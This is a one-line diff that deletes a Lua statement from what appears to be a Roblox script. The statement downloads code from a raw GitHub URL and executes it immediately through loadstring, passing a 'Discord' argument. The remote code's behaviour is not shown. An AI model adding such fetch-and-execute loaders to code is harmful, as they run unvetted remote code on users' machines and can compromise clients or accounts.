@@ -1,1 +1,0 @@
-loadstring(game:HttpGet'https://raw.githubusercontent.com/stavratum/lua/main/mmm/Main.lua')()(Discord)
